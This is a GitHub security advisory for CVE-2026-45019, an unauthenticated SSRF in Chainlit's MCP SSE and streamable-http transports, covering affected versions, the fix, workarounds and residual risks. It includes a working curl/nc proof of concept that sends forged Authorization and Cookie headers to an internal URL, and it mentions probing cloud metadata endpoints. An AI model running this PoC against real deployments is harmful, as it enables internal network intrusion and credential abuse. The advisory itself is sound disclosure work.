# [H] Chainlist has SSRF via MCP SSE and streamable-http transports that allows unauthenticated internal network access

## Summary
Severity: High
Advisory: GHSA-hvfh-5mj3-5f3j
CVE: CVE-2026-45019
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-hvfh-5mj3-5f3j
Type: github-advisory

## Affected
- PyPI: `chainlit` — affected >=2.4.0rc0 <2.12.0

## Details
### Am I affected?

Only if your deployment sets `features.mcp.enabled = true` in `.chainlit/config.toml`. **MCP has been disabled by default since v2.7.0**, so most Chainlit deployments are not affected. No authentication is required: `/mcp` is reachable by any client that can open a session.

### Summary

When MCP is enabled (`features.mcp.enabled = true`), the `POST /mcp` endpoint for `sse` and `streamable-http` transports accepts a user-controlled `url` and optional `headers` dictionary without any validation. An unauthenticated attacker can force the Chainlit server to make outbound HTTP requests to arbitrary URLs — including internal network services and cloud metadata endpoints — with attacker-controlled HTTP headers such as `Authorization` and `Cookie`.


### Affected / patched versions

| | |
|---|---|
| CVE | CVE-2026-45019 |
| Affected — URL-based SSRF | `>=2.4.0rc0, <2.12.0` (sink present since MCP support was introduced, PR #1977) |
| Affected — attacker-controlled header forwarding (amplifies the above) | `>=2.6.4, <2.12.0` (added in PR #2292) |
| Patched | **2.12.0** (releasing 2026-08-25) |

### Details

The Pydantic request models in `backend/chainlit/types.py` define `url` as a bare `str` with no scheme check, no private IP filtering, and no allowlist. When `clientType` is `"sse"` or `"streamable-http"`, the handler in `backend/chainlit/server.py` passes the URL and headers directly to the MCP SDK's `sse_client()` or `streamablehttp_client()`, which make outbound HTTP requests from the server.

The SSE URL sink has existed since MCP support was first introduced in v2.4.0rc0 (PR #1977). PR #2292 (merged 2025-07-30, released in v2.6.4) added `streamable-http` support and introduced attacker-controlled `headers` forwarding for both transports. This amplified the SSRF from a simple URL-based request to one where the attacker can set arbitrary HTTP headers like `Authorization` and `Cookie`.

This is a blind SSRF: the server makes the outbound request, but the response is consumed internally by the MCP client and never returned to the attacker. In cloud environments, an attacker could probe metadata endpoints (e.g., 169.254.169.254).

**Vulnerable code:** `backend/chainlit/server.py` — `connect_mcp` handler
**Sink:** `backend/chainlit/server.py` — `sse_client` / `streamablehttp_client`

### PoC

Tested against Chainlit 2.11.0 with `features.mcp.enabled = true` and a local TCP listener.

1. Start a listener to capture the server-side request:

```bash
nc -l 4445
```

2. Establish a Socket.IO session and trigger the SSRF:

```bash
EIO_SID=$(curl -s 'http://TARGET:8000/ws/socket.io/?EIO=4&transport=polling' \
  | python3 -c "import sys,json; print(json.loads(sys.stdin.read()[1:])['sid'])")

curl -s -X POST \
  "http://TARGET:8000/ws/socket.io/?EIO=4&transport=polling&sid=$EIO_SID" \
  -d '40{"sessionId":"ssrf","userEnv":"{}","clientType":"webapp"}'

curl -s -X POST 'http://TARGET:8000/mcp' \
  -H 'Content-Type: application/json' \
  -d '{
    "sessionId": "ssrf",
    "clientType": "streamable-http",
    "name": "probe",
    "url": "http://127.0.0.1:4445/internal-admin",
    "headers": {
      "Authorization": "Bearer attacker-controlled-token",
      "X-Internal-Secret": "exfiltrated",
      "Cookie": "session=hijacked"
    }
  }'
```

3. The listener captures the server-side request with all attacker-controlled headers:

```
POST /internal-admin HTTP/1.1
Host: 127.0.0.1:4445
Authorization: Bearer attacker-controlled-token
X-Internal-Secret: exfiltrated
Cookie: session=hijacked
```

### Impact

**High.** An unauthenticated attacker can force the Chainlit server to make HTTP requests to arbitrary internal or external services, with fully attacker-controlled headers.

Although this is a blind SSRF — the response body is never returned to the attacker — the vulnerable versions apply no allowlist to either the destination URL or the headers. Full control over both is enough to issue **state-changing, authenticated requests to internal APIs**: the PoC above is itself a POST carrying a forged `Authorization` header. Write operations against internal services do not require reading the response to have effect, so this goes beyond passive reconnaissance. The same primitive also enables internal service discovery, port scanning, and probing cloud metadata endpoints (e.g., AWS IMDSv1 at 169.254.169.254). Any Chainlit deployment with MCP enabled is affected.

### Fix

Chainlit 2.12.0 introduces an opt-in, allowlist-based model for user-provided SSE / streamable-http connections:

- User-provided MCP connections now require explicit opt-in via `features.mcp.user_servers.enabled = true`, plus a non-empty `allowed_urls` allowlist. The default is deny-all — no outbound URL is permitted unless explicitly listed.
- URLs are validated: http/https only, with scheme/host/port/path-prefix matching against the allowlist. Requests with `.`/`..` path segments, encoded separators (`%2e`, `%2f`, `%5c`), double-encoded sequences (`%25`), backslashes, or non-ASCII characters in the path are rejected.
- Restricted headers are stripped from user-supplied headers before the request is sent: `Cookie`, `Host`, `Forwarded`, `X-Forwarded-*`, `X-Real-IP`, `Via`, `Proxy-Authorization`, `X-HTTP-Method-Override`, `X-Original-URL`, `X-Rewrite-URL`, and hop-by-hop headers. `Authorization` is deliberately still forwarded — for user-provided servers, passing a caller-supplied credential to the allowlisted target is the point of the feature, and the destination is now constrained by `allowed_urls`.
- Named (developer-configured) server URLs and headers are no longer returned to the browser, on either the success or the error path, and `GET /project/settings` no longer discloses `allowed_urls`.

During remediation the maintainers also identified and closed two ways an allowlist could otherwise be bypassed once introduced. Neither adds to the pre-fix impact described above, since the vulnerable versions had no allowlist to bypass in the first place — they are hardening measures for the new allowlist:

- HTTP redirects are no longer followed on MCP transports. The underlying SDK hardcoded `follow_redirects=True`, so only the first hop of a request would ever have been checked against an allowlist.
- Every outgoing transport request is now re-checked against the connection's grant, not just the initial URL. The MCP SSE protocol takes its POST target from the server's `endpoint` event, and the SDK validates only scheme and host on that event, so an allowlisted server could otherwise redirect subsequent writes elsewhere on the same host.

A companion advisory (CVE-2026-45018) covers the corresponding fix for command injection via the stdio transport.

### Workarounds

If you cannot upgrade immediately:

- Set `features.mcp.enabled = false` in `.chainlit/config.toml`. This fully prevents exploitation of this issue (and of the companion stdio command-injection issue, CVE-2026-45018).
- Restrict outbound network egress from the host running Chainlit (e.g., firewall rules blocking access to internal address ranges and the cloud metadata endpoint).
- Configure authentication (register an auth callback) so that `/mcp` requires an authenticated session. This does not eliminate the SSRF for authenticated users, but removes the unauthenticated attack path.

### Upgrading to 2.12.0

> **Breaking change.** 2.12.0 changes how MCP servers are configured. If `.chainlit/config.toml` still uses the legacy `[features.mcp.sse]`, `[features.mcp.stdio]`, or `[features.mcp.streamable-http]` sections, or the `allowed_executables` setting, the application will fail to start **once MCP is enabled**, until you migrate to the new `[[features.mcp.servers]]` / `allowed_urls` configuration. See the migration guide in `CHANGELOG.md` before upgrading. Deployments with `features.mcp.enabled = false` are not affected by this startup check.

### Residual risk after upgrading

- On deployments with no authentication configured, `/mcp` remains reachable anonymously after upgrading, because `get_current_user` returns `None` when no auth callback is registered. Where `features.mcp.user_servers.enabled = true`, an anonymous client can therefore still drive outbound requests to any URL on the `allowed_urls` allowlist, with an `Authorization` header of its own choosing.
- There is no private-IP or IP-literal blocking. The allowlist is hostname-based, so a DNS name that resolves to a loopback, link-local, or cloud metadata address is not rejected. Closing this without introducing a TOCTOU window requires resolve-then-pin validation, which is deliberately deferred rather than shipped as a partial mitigation.
- Header filtering in 2.12.0 is a denylist, not an allowlist. An allowlist model is the intended future direction.

### Credits

Vipin <vipin@spl.team>
SPL <security@spl.team>

## References
- https://github.com/Chainlit/chainlit/security/advisories/GHSA-hvfh-5mj3-5f3j
- https://github.com/Chainlit/chainlit/commit/0565fd0eccb915fce159929598b053ed79f6e0c9
- https://github.com/Chainlit/chainlit
- https://github.com/Chainlit/chainlit/blob/2.12.0/docs/security-advisory-2026-mcp.md#spl-2026-002--ssrf-via-mcp-streamable-http--sse
- https://github.com/Chainlit/chainlit/releases/tag/2.12.0
